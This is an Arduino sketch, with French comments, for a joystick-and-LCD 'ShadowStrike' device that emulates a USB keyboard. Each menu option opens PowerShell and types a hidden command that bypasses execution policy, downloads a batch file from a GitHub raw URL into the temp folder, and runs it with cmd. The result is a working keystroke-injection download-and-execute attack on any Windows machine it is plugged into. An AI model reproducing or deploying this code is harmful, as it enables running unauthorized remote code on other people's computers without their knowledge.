#include <Wire.h>
#include <rgb_lcd.h>
#include <HIDKeyboard.h>


HIDKeyboard keyboard;  // Initialize HIDKeyboard object
rgb_lcd lcd;


uint8_t buf[8] = {
  0
};

bool scriptExecuted1 = false;
bool scriptExecuted2 = false;
bool scriptExecuted3 = false;
bool scriptExecuted4 = false;

void script(int choix);

// put your setup code here, to run once:
const int joystickX = A0;  // Axe X du joystick connecté à A0
const int joystickY = A1;  // Axe Y du joystick connecté à A1
const int buttonPin = 12;  // Bouton du joystick connecté à D12

int lastYPosition = 512;  // Position centrale pour l'axe Y
bool lastButtonState = HIGH;
bool buttonPressed = false;

const int menuItems = 5;
int currentItem = 0;
int validation;
String menu[menuItems] = { "ShadowStrike", "Option 1", "Option 2", "Option 3", "Option 4" };

void setup() {
  lcd.print("Shadowstrike");
  pinMode(joystickX, INPUT);
  pinMode(joystickY, INPUT);
  pinMode(buttonPin, INPUT_PULLUP);

  lcd.begin(16, 2);

  keyboard.begin();  // Start communication
  delay(200);
}

void loop() {
  //lcd.setRGB(255,255,255);

  int yPosition = analogRead(joystickY);
  bool buttonState = digitalRead(buttonPin);
  int Maxmenu = 5;
  // Détecter le mouvement du joystick
  if (yPosition < 10) {
    currentItem = (currentItem - 1) % menuItems;
    displayCurrentItem();
    delay(100);

    //    lastYPosition = yPosition;
    buttonPressed = false;  // Réinitialiser l'état du bouton après le déplacement
  }
  if (currentItem < 0) {
    currentItem = 5;
  }
  if (currentItem > Maxmenu) {
    currentItem = 0;
  }
  if (yPosition > 1000) {
    currentItem = (currentItem + 1) % menuItems;
    displayCurrentItem();
    delay(100);
    //    lastYPosition = yPosition;
    buttonPressed = false;  // Réinitialiser l'état du bouton après le déplacement
  }

  // Sélectionner l'option avec le bouton
  if (buttonState == LOW && lastButtonState == HIGH) {
    lcd.setRGB(0, 255, 0);  // Vert pour l'option sélectionnée
    lcd.setCursor(0, 1);
    lcd.print("Validé ! ");
    delay(1000);  // Afficher l'option choisie pendant un moment
    buttonPressed = true;
    validation = currentItem;
    displayCurrentItem();
  }

  lastButtonState = buttonState;
  delay(100);  // Délai pour la fluidité


  switch (validation) {

    case 1:
      lcd.setCursor(0, 1);
      lcd.setRGB(255, 0, 255);

      if (!scriptExecuted1) {
        script(1);               // Appeler la fonction script si elle n'a pas été exécutée   //le paramètre choisi le num du script qu'on veux
        scriptExecuted1 = true;  // Mettre à jour l'indicateur
      }

      break;
    case 2:
      lcd.setCursor(0, 1);
      lcd.setRGB(0, 255, 255);

      if (!scriptExecuted2) {
        script(2);               // Appeler la fonction script si elle n'a pas été exécutée   //le paramètre choisi le num du script qu'on veux
        scriptExecuted2 = true;  // Mettre à jour l'indicateur
      }

      break;
    case 3:
      lcd.setCursor(0, 1);
      lcd.setRGB(0, 0, 255);

      if (!scriptExecuted3) {
        script(3);               // Appeler la fonction script si elle n'a pas été exécutée   //le paramètre choisi le num du script qu'on veux
        scriptExecuted3 = true;  // Mettre à jour l'indicateur
      }

      break;

    case 4:
      lcd.setCursor(0, 1);
      lcd.setRGB(255, 0, 0);

      if (!scriptExecuted4) {
        script(4);               // Appeler la fonction script si elle n'a pas été exécutée   //le paramètre choisi le num du script qu'on veux
        scriptExecuted4 = true;  // Mettre à jour l'indicateur
      }

      break;
  }
}

void displayCurrentItem() {
  lcd.clear();
  lcd.setCursor(0, 0);
  //lcd.setRGB(255,0,255); // violet pour l'option en cours
  lcd.print(menu[currentItem]);
}



////////
void script(int choix) {

  switch (choix) {
    case 1:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script1.txt");
      finprog();
      break;
    case 2:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script5.bat");
      finprog();
      break;
    case 3:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script7.bat");
      finprog();
      break;
    case 4:
      windterm();
      keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass @(New-Object System.Net.WebClient).DownloadFile(");
      write(1);
      keyboard.print("https://raw.githubusercontent.com/TcLVG/ShadowStrike/Elohyrr-patch-2/script2.bat");
      finprog();
      break;
  }
}

void write(int choix) {
  if (choix == 1) {        //pour un '
    buf[2] = 0x34;         // ' key
    Serial.write(buf, 8);  // Send keypress
    keyboard.releaseKey();
  } else if (choix == 2) {  // pour une ,
    buf[2] = 0x36;          // , key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  } else if (choix == 3) {  //pour un "\"
    buf[2] = 0x64;          // \ key
    Serial.write(buf, 8);   // Send keypress
    keyboard.releaseKey();
  }
}

void windterm() {
  delay(10);
  keyboard.pressSpecialKey(GUI);  // Press the GUI (Windows) key
  keyboard.releaseKey();          // Release the GUI key

  delay(1000);
  keyboard.print("powershell");
  delay(1000);
  keyboard.pressSpecialKey(ENTER);
  delay(100);
  keyboard.releaseKey();
  delay(2500);
}

void finprog() {
  write(1);
  write(2);
  keyboard.pressKey(' ');
  keyboard.releaseKey();
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.print("); Start-Process ");
  write(1);
  keyboard.print("cmd");
  write(1);
  keyboard.print(" -ArgumentList ");
  write(1);
  keyboard.print("/c");
  write(1);
  write(2);
  write(1);
  keyboard.print("$env:temp");
  write(3);
  keyboard.print("testscript.bat");
  write(1);
  keyboard.pressKey('@');  // le @ donne un "


  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
}